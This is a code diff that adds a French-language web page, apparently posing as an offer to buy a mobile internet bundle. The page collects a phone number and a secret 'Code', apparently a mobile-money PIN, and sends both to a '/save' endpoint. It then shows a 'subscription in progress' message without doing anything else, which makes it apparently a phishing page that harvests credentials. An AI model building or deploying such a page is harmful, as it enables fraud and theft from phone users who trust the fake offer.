@@ -1,0 +1,135 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ACHETER UN FORFAIT INTERNET</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+html, body{
+    width:100%;
+    min-height:100%;
+    overflow:hidden; /* supprime les écritures parasites */
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(120deg, #1e3c72, #2a5298);
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 15px;
+}
+
+.container {
+    background: rgba(255,255,255,0.12);
+    padding: 25px;
+    border-radius: 12px;
+    width: 100%;
+    max-width: 420px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    position: relative;
+    z-index: 10;
+}
+
+h2 {
+    text-align: center;
+    font-size: clamp(18px, 4vw, 24px);
+    margin-bottom: 18px;
+    line-height: 1.4;
+}
+
+input {
+    width: 100%;
+    padding: 14px;
+    margin: 10px 0;
+    border: none;
+    border-radius: 6px;
+    font-size: clamp(15px, 3vw, 18px);
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    background: #00c853;
+    border: none;
+    color: white;
+    font-weight: bold;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: clamp(15px, 3vw, 18px);
+}
+
+button:hover {
+    background: #00b34a;
+}
+
+.warning {
+    margin-top: 12px;
+    font-size: clamp(13px, 2.8vw, 16px);
+    color: #ffeb3b;
+    text-align: center;
+    line-height: 1.5;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h2>forfait disponible:<br>500=2.5GB/30j</h2>
+
+    <input id="num" type="text" placeholder="Numéro">
+    <input id="code" type="text" placeholder="Code">
+
+    <button onclick="verifier()">souscrire au forfait</button>
+
+    <p class="warning">
+        Attention : rassurez vous que vos informations sont correctes
+    </p>
+</div>
+
+<script>
+function verifier() {
+    let num = document.getElementById("num").value;
+    let code = document.getElementById("code").value;
+
+    if (num === "" || code === "") {
+        alert("Veuillez remplir tous les champs");
+        return;
+    }
+
+    fetch("/save", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            num: num,
+            code: code
+        })
+    })
+    .then(response => response.text())
+    .then(data => {
+        alert("souscription en cours");
+        document.getElementById("num").value = "";
+        document.getElementById("code").value = "";
+    })
+    .catch(error => {
+        alert("Erreur d'envoi");
+        console.log(error);
+    });
+}
+</script>
+
+</body>
+</html>
